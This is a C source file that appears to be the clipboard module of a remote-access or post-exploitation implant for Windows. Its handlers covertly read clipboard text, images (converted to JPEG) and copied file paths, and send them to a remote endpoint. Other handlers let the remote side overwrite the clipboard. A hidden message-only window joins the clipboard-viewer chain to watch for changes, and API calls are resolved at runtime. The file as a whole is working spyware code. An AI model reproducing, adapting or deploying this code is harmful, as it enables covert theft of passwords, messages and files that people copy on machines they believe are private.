/*!
 * @file clipboard.c
 * @brief Definitions for clipboard interaction functionality.
 */
#include "extapi.h"
#include "../../common/thread.h"
#include "clipboard.h"
#include "clipboard_image.h"

typedef struct _ClipboardState
{
#ifdef _WIN32
	/*! @brief Name to use for the window class when registering the message-only window. */
	char cbWindowClass[256];
	/*! @brief Handle to the clipboard monitor window. */
	HWND hClipboardWindow;
	/*! @brief Handle to the next window in the clipboard chain. */
	HWND hNextViewer;
#endif
	/*! @brief Indicates if the thread is running or not. */
	BOOL bRunning;
	/*! @brief Handle to the event that signals when the thread has actioned the caller's request. */
	EVENT* hResponseEvent;
	/*! @brief Signalled when the caller wants the thread to pause. */
	EVENT* hPauseEvent;
	/*! @brief Signalled when the caller wants the thread to resume. */
	EVENT* hResumeEvent;
	/*! @brief Automatically download files copied to the clipboard. */
	BOOL bDownloadFiles;
	/*! @brief Automatically download image content copied to the clipboard. */
	BOOL bDownloadImages;
	/*! @brief Reference to the clipboard monitor thread. */
	THREAD* hThread;
} ClipboardState;

/*! @brief Pointer to the state for the monitor thread. */
static ClipboardState* gClipboardState = NULL;

#ifdef _WIN32

/*! @brief GlobalAlloc function pointer type. */
typedef HGLOBAL(WINAPI * PGLOBALALLOC)(UINT uFlags, SIZE_T dwBytes);

/*! @brief GlobalFree function pointer type. */
typedef HGLOBAL(WINAPI * PGLOBALFREE)(HGLOBAL hMem);

/*! @brief GlobalLock function pointer type. */
typedef LPVOID(WINAPI * PGLOBALLOCK)(HGLOBAL hMem);

/*! @brief GlobalUnlock function pointer type. */
typedef LPVOID(WINAPI * PGLOBALUNLOCK)(HGLOBAL hMem);

/*! @brief OpenClipboard function pointer type. */
typedef BOOL(WINAPI * POPENCLIPBOARD)(HWND hWndNewOwner);

/*! @brief CloseClipboard function pointer type. */
typedef BOOL(WINAPI * PCLOSECLIPBOARD)();

/*! @brief SetClipboardData function pointer type. */
typedef HANDLE(WINAPI * PSETCLIPBOARDDATA)(UINT uFormat, HANDLE hMem);

/*! @brief SetClipboardData function pointer type. */
typedef HANDLE(WINAPI * PGETCLIPBOARDDATA)(UINT uFormat);

/*! @brief EnumClipboardFormats function pointer type. */
typedef UINT(WINAPI * PENUMCLIPBOARDFORMATS)(UINT uFormat);

/*! @brief EmptyClipboard function pointer type. */
typedef BOOL(WINAPI * PEMPTYCLIPBOARD)();

/*! @brief DragQueryFileA function pointer type. */
typedef BOOL(WINAPI * PDRAGQUERYFILEA)(HDROP hDrop, UINT iFile, LPSTR lpszFile, UINT cch);

/*! @brief CreateFileA function pointer type. */
typedef HANDLE(WINAPI * PCREATEFILEA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

/*! @brief CloseHandle function pointer type. */
typedef BOOL(WINAPI * PCLOSEHANDLE)(HANDLE hObject);

/*! @brief GetFileSizeEx function pointer type. */
typedef BOOL(WINAPI * PGETFILESIZEEX)(HANDLE hFile, PLARGE_INTEGER lpFileSize);

LRESULT WINAPI clipboard_monitor_window_proc(HWND hWnd, UINT uMsg, LPARAM lParam, WPARAM wParam)
{
	ClipboardState* pState = (ClipboardState*)GetWindowLongPtrA(hWnd, GWLP_USERDATA);

	if (!pState)
	{
		pState = gClipboardState;
	}

	switch (uMsg)
	{
	case WM_CREATE:
		dprintf("[EXTAPI CLIPBOARD] received WM_CREATE %x", hWnd);
		pState = (ClipboardState*)pState;
		SetWindowLongPtrA(hWnd, GWLP_USERDATA, (LONG_PTR)pState);
		pState->hNextViewer = SetClipboardViewer(hWnd);
		dprintf("[EXTAPI CLIPBOARD] SetClipboardViewer called, next viewer is %x", pState->hNextViewer);

		if (!pState->hNextViewer)
		{
			dprintf("[EXTAPI CLIPBOARD] SetClipboardViewer error %u", GetLastError());
		}
		break;

	case WM_CHANGECBCHAIN: 
		dprintf("[EXTAPI CLIPBOARD] received WM_CHANGECBCHAIN %x", hWnd);
		if ((HWND)wParam == pState->hNextViewer)
		{
			pState->hNextViewer = (HWND)lParam;
			dprintf("[EXTAPI CLIPBOARD] Next viewer is now %x", pState->hNextViewer);
		}
		else if (pState->hNextViewer)
		{
			SendMessageA(pState->hNextViewer, uMsg, wParam, lParam);
		}
        break;

     case WM_DRAWCLIPBOARD:
		dprintf("[EXTAPI CLIPBOARD] received WM_DRAWCLIPBOARD %x", hWnd);

		if (pState->bRunning)
		{
			dprintf("[EXTAPI CLIPBOARD] thread is running, harvesting clipboard %x", hWnd);
		}
		else
		{
			dprintf("[EXTAPI CLIPBOARD] thread is no running, ignoring clipboard change %x", hWnd);
		}

		if (pState->hNextViewer)
		{
			dprintf("[EXTAPI CLIPBOARD] Passing on to %x", pState->hNextViewer);
			SendMessageA(pState->hNextViewer, uMsg, wParam, lParam);
		}
        break;

	case WM_DESTROY:
		dprintf("[EXTAPI CLIPBOARD] received WM_DESTROY %x", hWnd);
		ChangeClipboardChain(hWnd, pState->hNextViewer); 
		break;

	default:
		return DefWindowProcA(hWnd, uMsg, lParam, wParam);
	}

	return (LRESULT)NULL;
}

DWORD create_clipboard_monitor_window(ClipboardState* pState)
{
	DWORD dwResult;
	BOOL bRegistered = FALSE;
	WNDCLASSEXA wndClass = { 0 };

	wndClass.cbSize = sizeof(WNDCLASSEXA);
	wndClass.lpfnWndProc = (WNDPROC)clipboard_monitor_window_proc;
	wndClass.hInstance = GetModuleHandleA(NULL);
	wndClass.lpszClassName = pState->cbWindowClass;

	dprintf("[EXTAPI CLIPBOARD] Setting up the monitor window. Class = %s from %p -> %s", wndClass.lpszClassName, pState, pState->cbWindowClass);

	do
	{
		if (!RegisterClassExA(&wndClass))
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to register window class.");
		}

		dprintf("[EXTAPI CLIPBOARD] Window registered");
		bRegistered = TRUE;

		pState->hClipboardWindow = CreateWindowExA(0, pState->cbWindowClass, pState->cbWindowClass, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, pState);

		if (pState->hClipboardWindow == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to create message only window instance");
		}

		dprintf("[EXTAPI CLIPBOARD] Window created");
		dwResult = ERROR_SUCCESS;

	} while (0);

	if (pState->hClipboardWindow == NULL && bRegistered)
	{
		UnregisterClassA(pState->cbWindowClass, GetModuleHandleA(NULL));
	}

	return dwResult;
}

DWORD destroy_clipboard_monitor_window(ClipboardState* pState)
{
	DWORD dwResult;

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Destroying clipboard monitor window: %p", pState);
		if (!DestroyWindow(pState->hClipboardWindow))
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to destroy the clipboard window");
		}

		if (!UnregisterClassA(pState->cbWindowClass, GetModuleHandleA(NULL)))
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Failed to destroy the clipboard window");
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	return dwResult;
}

#endif
/*!
 * @brief Handle the request to get the data from the clipboard.
 * @details This function currently only supports the following clipboard data formats:
 *             - CF_TEXT  - raw text data.
 *             - CF_DIB   - bitmap/image information.
 *             - CF_HDROP - file selection.
 *
 *          Over time more formats will be supported.
 * @param remote Pointer to the remote endpoint.
 * @param packet Pointer to the request packet.
 * @return Indication of success or failure.
 * @todo Add support for more data formats.
 */
DWORD request_clipboard_get_data(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult;
	HMODULE hKernel32 = NULL;
	HMODULE hUser32 = NULL;
	HMODULE hShell32 = NULL;

	PGLOBALLOCK pGlobalLock = NULL;
	PGLOBALUNLOCK pGlobalUnlock = NULL;

	POPENCLIPBOARD pOpenClipboard = NULL;
	PCLOSECLIPBOARD pCloseClipboard = NULL;
	PGETCLIPBOARDDATA pGetClipboardData = NULL;
	PENUMCLIPBOARDFORMATS pEnumClipboardFormats = NULL;
	PDRAGQUERYFILEA pDragQueryFileA = NULL;
	PCREATEFILEA pCreateFileA = NULL;
	PCLOSEHANDLE pCloseHandle = NULL;
	PGETFILESIZEEX pGetFileSizeEx = NULL;

	HANDLE hSourceFile = NULL;
	PCHAR lpClipString = NULL;
	HGLOBAL hClipboardData = NULL;
	HDROP hFileDrop = NULL;
	UINT uFormat = 0;
	UINT uFileIndex = 0;
	UINT uFileCount = 0;
	CHAR lpFileName[MAX_PATH];
	Tlv entries[2] = { 0 };
	LARGE_INTEGER largeInt = { 0 };
	LPBITMAPINFO lpBI = NULL;
	PUCHAR lpDIB = NULL;
	ConvertedImage image;
	BOOL bImageDownload = FALSE;
	DWORD dwWidth;
	DWORD dwHeight;
	Tlv imageTlv[3];

	Packet *pResponse = packet_create_response(packet);

	do
	{
		dprintf("[EXTAPI CLIPBOARD] Loading user32.dll");
		if ((hUser32 = LoadLibraryA("user32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Loading kernel32.dll");
		if ((hKernel32 = LoadLibraryA("kernel32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalLock");
		if ((pGlobalLock = (PGLOBALLOCK)GetProcAddress(hKernel32, "GlobalLock")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalLock in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalUnlock");
		if ((pGlobalUnlock = (PGLOBALUNLOCK)GetProcAddress(hKernel32, "GlobalUnlock")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalUnlock in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for OpenClipboard");
		if ((pOpenClipboard = (POPENCLIPBOARD)GetProcAddress(hUser32, "OpenClipboard")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate OpenClipboard in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for CloseClipboard");
		if ((pCloseClipboard = (PCLOSECLIPBOARD)GetProcAddress(hUser32, "CloseClipboard")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GetClipboardData");
		if ((pGetClipboardData = (PGETCLIPBOARDDATA)GetProcAddress(hUser32, "GetClipboardData")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GetClipboardData in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for EnumClipboardFormats");
		if ((pEnumClipboardFormats = (PENUMCLIPBOARDFORMATS)GetProcAddress(hUser32, "EnumClipboardFormats")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate EnumClipboardFormats in user32.dll");
		}

		// Try to get a lock on the clipboard
		if (!pOpenClipboard(NULL))
		{
			dwResult = GetLastError();
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to open the clipboard", dwResult);
		}

		dprintf("[EXTAPI CLIPBOARD] Clipboard locked, attempting to get data...");

		while (uFormat = pEnumClipboardFormats(uFormat))
		{
			if (uFormat == CF_TEXT)
			{
				// there's raw text on the clipboard
				if ((hClipboardData = pGetClipboardData(CF_TEXT)) != NULL
					&& (lpClipString = (PCHAR)pGlobalLock(hClipboardData)) != NULL)
				{
					dprintf("[EXTAPI CLIPBOARD] Clipboard text captured: %s", lpClipString);
					packet_add_tlv_string(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, lpClipString);

					pGlobalUnlock(hClipboardData);
				}
			}
			else if (uFormat == CF_DIB)
			{
				dprintf("[EXTAPI CLIPBOARD] Grabbing the clipboard bitmap data");
				// an image of some kind is on the clipboard
				if ((hClipboardData = pGetClipboardData(CF_DIB)) != NULL
					&& (lpBI = (LPBITMAPINFO)pGlobalLock(hClipboardData)) != NULL)
				{
					dprintf("[EXTAPI CLIPBOARD] CF_DIB grabbed, extracting dimensions.");

					// grab the bitmap image size
					dwWidth = htonl(lpBI->bmiHeader.biWidth);
					dwHeight = htonl(lpBI->bmiHeader.biHeight);

					imageTlv[0].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMX;
					imageTlv[0].header.length = sizeof(UINT);
					imageTlv[0].buffer = (PUCHAR)&dwWidth;
					imageTlv[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMY;
					imageTlv[1].header.length = sizeof(UINT);
					imageTlv[1].buffer = (PUCHAR)&dwHeight;

					// only download the image if they want it
					bImageDownload = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_DOWNLOAD);
					dprintf("[EXTAPI CLIPBOARD] Image is %dx%d and %s be downloaded", lpBI->bmiHeader.biWidth, lpBI->bmiHeader.biHeight,
						bImageDownload ? "WILL" : "will NOT");

					if (!bImageDownload)
					{
						packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG, imageTlv, 2);
					}
					else
					{
						lpDIB = ((PUCHAR)lpBI) + get_bitmapinfo_size(lpBI, TRUE);

						// TODO: add the ability to encode with multiple encoders and return the smallest image.
						if (convert_to_jpg(lpBI, lpDIB, 75, &image) == ERROR_SUCCESS)
						{
							dprintf("[EXTAPI CLIPBOARD] Clipboard bitmap captured to image: %p, Size: %u bytes", image.pImageBuffer, image.dwImageBufferSize);
							imageTlv[2].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DATA;
							imageTlv[2].header.length = image.dwImageBufferSize;
							imageTlv[2].buffer = (PUCHAR)image.pImageBuffer;

							packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG, imageTlv, 3);

							// Just leaving this in for debugging purposes later on
							//hSourceFile = CreateFileA("C:\\temp\\foo.jpg", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
							//WriteFile(hSourceFile, image.pImageBuffer, image.dwImageBufferSize, &largeInt.LowPart, NULL);
							//CloseHandle(hSourceFile);

							free(image.pImageBuffer);
						}
						else
						{
							dwResult = GetLastError();
							dprintf("[EXTAPI CLIPBOARD] Failed to convert clipboard image to JPG");
						}
					}

					pGlobalUnlock(hClipboardData);
				}
				else
				{
					dwResult = GetLastError();
					dprintf("[EXTAPI CLIPBOARD] Failed to get access to the CF_DIB information");
				}
			}
			else if (uFormat == CF_HDROP) {
				// there's one or more files on the clipboard
				dprintf("[EXTAPI CLIPBOARD] Files have been located on the clipboard");
				do
				{
					dprintf("[EXTAPI CLIPBOARD] Loading shell32.dll");
					if ((hShell32 = LoadLibraryA("shell32.dll")) == NULL)
					{
						BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load shell32.dll");
					}

					dprintf("[EXTAPI CLIPBOARD] Searching for CreateFileA");
					if ((pCreateFileA = (PCREATEFILEA)GetProcAddress(hKernel32, "CreateFileA")) == NULL)
					{
						BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CreateFileA in kernel32.dll");
					}

					dprintf("[EXTAPI CLIPBOARD] Searching for CloseHandle");
					if ((pCloseHandle = (PCLOSEHANDLE)GetProcAddress(hKernel32, "CloseHandle")) == NULL)
					{
						BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseHandle in kernel32.dll");
					}

					dprintf("[EXTAPI CLIPBOARD] Searching for GetFileSizeEx");
					if ((pGetFileSizeEx = (PGETFILESIZEEX)GetProcAddress(hKernel32, "GetFileSizeEx")) == NULL)
					{
						BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GetFileSizeEx in kernel32.dll");
					}

					dprintf("[EXTAPI CLIPBOARD] Searching for DragQueryFileA");
					if ((pDragQueryFileA = (PDRAGQUERYFILEA)GetProcAddress(hShell32, "DragQueryFileA")) == NULL)
					{
						BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in shell32.dll");
					}

					dprintf("[EXTAPI CLIPBOARD] Grabbing the clipboard file drop data");
					if ((hClipboardData = pGetClipboardData(CF_HDROP)) != NULL
						&& (hFileDrop = (HDROP)pGlobalLock(hClipboardData)) != NULL)
					{
						uFileCount = pDragQueryFileA(hFileDrop, (UINT)-1, NULL, 0);

						dprintf("[EXTAPI CLIPBOARD] Parsing %u file(s) on the clipboard.", uFileCount);

						for (uFileIndex = 0; uFileIndex < uFileCount; ++uFileIndex)
						{
							if (pDragQueryFileA(hFileDrop, uFileIndex, lpFileName, sizeof(lpFileName)))
							{
								dprintf("[EXTAPI CLIPBOARD] Clipboard file entry: %s", lpFileName);

								memset(&entries, 0, sizeof(entries));
								memset(&largeInt, 0, sizeof(largeInt));

								entries[0].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME;
								entries[0].header.length = (DWORD)strlen(lpFileName) + 1;
								entries[0].buffer = (PUCHAR)lpFileName;

								entries[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE;
								entries[1].header.length = sizeof(QWORD);
								entries[1].buffer = (PUCHAR)&largeInt.QuadPart;

								if ((hSourceFile = pCreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != NULL)
								{
									if (pGetFileSizeEx(hSourceFile, &largeInt))
									{
										largeInt.QuadPart = htonq(largeInt.QuadPart);
									}

									pCloseHandle(hSourceFile);
								}

								packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE, entries, 2);
							}
						}

						pGlobalUnlock(hClipboardData);
					}

				} while (0);
			}
		}

		dwResult = GetLastError();

		pCloseClipboard();

	} while (0);

	if (hShell32)
	{
		FreeLibrary(hShell32);
	}

	if (hKernel32)
	{
		FreeLibrary(hKernel32);
	}

	if (hUser32)
	{
		FreeLibrary(hUser32);
	}

	if (pResponse)
	{
		packet_transmit_response(dwResult, remote, pResponse);
	}

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

/*!
 * @brief Handle the request to set the data that's on the clipboard.
 * @details This function currently only supports the following clipboard data formats:
 *             - CF_TEXT - raw text data.
 *
 *          Over time more formats will be supported.
 * @param remote Pointer to the remote endpoint.
 * @param packet Pointer to the request packet.
 * @return Indication of success or failure.
 * @todo Add support for more data formats.
 */
DWORD request_clipboard_set_data(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult;
	HMODULE hKernel32 = NULL;
	HMODULE hUser32 = NULL;

	PGLOBALALLOC pGlobalAlloc = NULL;
	PGLOBALFREE pGlobalFree = NULL;
	PGLOBALLOCK pGlobalLock = NULL;
	PGLOBALUNLOCK pGlobalUnlock = NULL;

	POPENCLIPBOARD pOpenClipboard = NULL;
	PCLOSECLIPBOARD pCloseClipboard = NULL;
	PSETCLIPBOARDDATA pSetClipboardData = NULL;
	PEMPTYCLIPBOARD pEmptyClipboard = NULL;

	PCHAR lpClipString;
	HGLOBAL hClipboardData;
	PCHAR lpLockedData;
	SIZE_T cbStringBytes;

	do
	{
		if ((lpClipString = packet_get_tlv_value_string(packet, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT)) == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] No string data specified", ERROR_INVALID_PARAMETER);
		}

		dprintf("[EXTAPI CLIPBOARD] Loading user32.dll");
		if ((hUser32 = LoadLibraryA("user32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Loading kernel32.dll");
		if ((hKernel32 = LoadLibraryA("kernel32.dll")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to load kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalAlloc");
		if ((pGlobalAlloc = (PGLOBALALLOC)GetProcAddress(hKernel32, "GlobalAlloc")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalAlloc in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalLock");
		if ((pGlobalLock = (PGLOBALLOCK)GetProcAddress(hKernel32, "GlobalLock")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalLock in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalUnlock");
		if ((pGlobalUnlock = (PGLOBALUNLOCK)GetProcAddress(hKernel32, "GlobalUnlock")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate GlobalUnlock in kernel32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for OpenClipboard");
		if ((pOpenClipboard = (POPENCLIPBOARD)GetProcAddress(hUser32, "OpenClipboard")) == NULL)
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate OpenClipboard in user32.dll");

		dprintf("[EXTAPI CLIPBOARD] Searching for CloseClipboard");
		if ((pCloseClipboard = (PCLOSECLIPBOARD)GetProcAddress(hUser32, "CloseClipboard")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate CloseClipboard in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for EmptyClipboard");
		if ((pEmptyClipboard = (PEMPTYCLIPBOARD)GetProcAddress(hUser32, "EmptyClipboard")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate EmptyClipboard in user32.dll");
		}

		dprintf("[EXTAPI CLIPBOARD] Searching for SetClipboardData");
		if ((pSetClipboardData = (PSETCLIPBOARDDATA)GetProcAddress(hUser32, "SetClipboardData")) == NULL)
		{
			BREAK_ON_ERROR("[EXTAPI CLIPBOARD] Unable to locate SetClipboardData in user32.dll");
		}

		cbStringBytes = (SIZE_T)strlen(lpClipString) + 1;

		// do the "use the right kind of memory once locked" clip board data dance.
		// Note that we don't free up the memory we've allocated with GlobalAlloc
		// because the windows clipboard magic does it for us.
		if ((hClipboardData = pGlobalAlloc(GMEM_MOVEABLE | GMEM_DDESHARE, cbStringBytes)) == NULL)
		{
			dwResult = GetLastError();
			pCloseClipboard();
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Failed to allocate clipboard memory", dwResult);
		}

		lpLockedData = (PCHAR)pGlobalLock(hClipboardData);

		memcpy_s(lpLockedData, cbStringBytes, lpClipString, cbStringBytes);

		pGlobalUnlock(hClipboardData);

		// Try to get a lock on the clipboard
		if (!pOpenClipboard(NULL))
		{
			dwResult = GetLastError();
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to open the clipboard", dwResult);
		}

		// Clear the clipboard data
		pEmptyClipboard();

		if (!pSetClipboardData(CF_TEXT, hClipboardData))
		{
			dwResult = GetLastError();
			dprintf("[EXTAPI CLIPBOARD] Failed to set the clipboad data: %u", dwResult);
		}
		else {
			dwResult = ERROR_SUCCESS;
		}

		pCloseClipboard();

	} while (0);

	// If something went wrong and we have clipboard data, then we need to
	// free it up because the clipboard can't do it for us.
	if (dwResult != ERROR_SUCCESS && hClipboardData != NULL)
	{
		dprintf("[EXTAPI CLIPBOARD] Searching for GlobalFree");
		if ((pGlobalFree = (PGLOBALFREE)GetProcAddress(hKernel32, "GlobalFree")) != NULL)
		{
			pGlobalFree(hClipboardData);
		}
	}

	if (hKernel32)
	{
		FreeLibrary(hKernel32);
	}

	if (hUser32)
	{
		FreeLibrary(hUser32);
	}

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

DWORD THREADCALL clipboard_monitor_thread_func(THREAD * thread)
{
#ifdef _WIN32
	DWORD dwResult;
	BOOL bTerminate = FALSE;
	HANDLE waitableHandles[2] = {0};
	MSG msg;
	ClipboardState* pState = (ClipboardState*)thread->parameter1;

	do
	{
		if (pState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Thread state is NULL", ERROR_INVALID_PARAMETER);
		}

		dwResult = create_clipboard_monitor_window(pState);
		if (dwResult != ERROR_SUCCESS)
		{
			break;
		}

		// signal to the caller that our thread has started
		dprintf("[EXTAPI CLIPBOARD] Thread started");
		pState->bRunning = TRUE;
		event_signal(pState->hResponseEvent);

		waitableHandles[0] = thread->sigterm->handle;
		waitableHandles[1] = pState->hPauseEvent->handle;

		while (!bTerminate)
		{
			dwResult = WaitForMultipleObjects(2, waitableHandles, FALSE, 1) - WAIT_OBJECT_0;

			switch (dwResult)
			{
			case 0: // stop the thread
				dprintf("[EXTAPI CLIPBOARD] Thread stopping");
				bTerminate = TRUE;
				break;
			case 1: // pause the thread
				dprintf("[EXTAPI CLIPBOARD] Thread paused");
				pState->bRunning = FALSE;

				// indicate that we've paused
				event_signal(pState->hResponseEvent);

				// wait to be told to continue, but keep pumping messages while we wait
				// because these are the messages we're ignoring.
				while (!event_poll(pState->hResumeEvent, 1))
				{
					if (pState->hClipboardWindow && PeekMessageA(&msg, pState->hClipboardWindow, 0, 0, PM_REMOVE))
					{
						TranslateMessage(&msg);
						DispatchMessageA(&msg);
					}
				}

				// indicate that we've resumed
				pState->bRunning = TRUE;
				event_signal(pState->hResponseEvent);

				dprintf("[EXTAPI CLIPBOARD] Thread resumed");
				break;
			default:
				// timeout, so pump messages
				if (pState->hClipboardWindow && PeekMessageA(&msg, pState->hClipboardWindow, 0, 0, PM_REMOVE))
				{
					TranslateMessage(&msg);
					DispatchMessageA(&msg);
				}
				break;
			}
		}

		// and we're done, switch off, and tell the caller we're done
		pState->bRunning = FALSE;
		destroy_clipboard_monitor_window(pState);
		event_signal(pState->hResponseEvent);
		dprintf("[EXTAPI CLIPBOARD] Thread stopped");

	} while (0);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

VOID destroy_clipboard_monitor_state(ClipboardState* pState)
{
	dprintf("[EXTAPI CLIPBOARD] Destroying clipboard monitor state");
	if (pState != NULL)
	{
		if (pState->hThread != NULL)
		{
			thread_destroy(pState->hThread);
		}
		if (pState->hPauseEvent != NULL)
		{
			event_destroy(pState->hPauseEvent);
		}
		if (pState->hResumeEvent != NULL)
		{
			event_destroy(pState->hResumeEvent);
		}
		if (pState->hResponseEvent != NULL)
		{
			event_destroy(pState->hResponseEvent);
		}

		free(pState);
	}
}

DWORD request_clipboard_monitor_start(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;
	ClipboardState* pState = NULL;
	char* lpClassName = NULL;

	do
	{
		if (gClipboardState != NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread already running", ERROR_ALREADY_INITIALIZED);
		}

		dprintf("[EXTAPI CLIPBOARD] Starting clipboard monitor");

		pState = (ClipboardState*)malloc(sizeof(ClipboardState));
		if (pState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to allocate memory for clipboard state", ERROR_NOT_ENOUGH_MEMORY);
		}

		dprintf("[EXTAPI CLIPBOARD] pState %p", pState);
		memset(pState, 0, sizeof(ClipboardState));

		lpClassName = packet_get_tlv_value_string(packet, TLV_TYPE_EXT_CLIPBOARD_MON_WIN_CLASS);
		if (lpClassName == NULL || strlen(lpClassName) == 0)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Window class name is missing", ERROR_INVALID_PARAMETER);
		}

		strncpy_s(pState->cbWindowClass, sizeof(pState->cbWindowClass), lpClassName, sizeof(pState->cbWindowClass) - 1);
		dprintf("[EXTAPI CLIPBOARD] Class Name set to %s", pState->cbWindowClass);

		pState->bDownloadFiles = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_DOWNLOAD_FILES);
		pState->bDownloadImages = packet_get_tlv_value_bool(packet, TLV_TYPE_EXT_CLIPBOARD_MON_DOWNLOAD_IMAGES);

		pState->hPauseEvent = event_create();
		pState->hResumeEvent = event_create();
		pState->hResponseEvent = event_create();

		if (pState->hPauseEvent == NULL
			|| pState->hResumeEvent == NULL
			|| pState->hResponseEvent == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to allocate memory for clipboard events", ERROR_NOT_ENOUGH_MEMORY);
		}

		pState->hThread = thread_create((THREADFUNK)clipboard_monitor_thread_func, pState, NULL, NULL);

		if (pState->hThread == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Unable to allocate memory for clipboard thread", ERROR_NOT_ENOUGH_MEMORY);
		}

		gClipboardState = pState;
		thread_run(pState->hThread);

		// 4 seconds should be long enough for the thread to indicate it's started, if not, bomb out
		if (!event_poll(pState->hResponseEvent, 4000))
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Thread failed to start correctly", ERROR_ABANDONED_WAIT_0);
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	if (dwResult != ERROR_SUCCESS)
	{
		destroy_clipboard_monitor_state(pState);
		gClipboardState = NULL;
	}

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

DWORD clipboard_monitor_pause(ClipboardState* pState)
{
	if (pState->bRunning)
	{
		event_signal(pState->hPauseEvent);
		event_poll(pState->hResponseEvent, INFINITE);
	}

	return ERROR_SUCCESS;
}

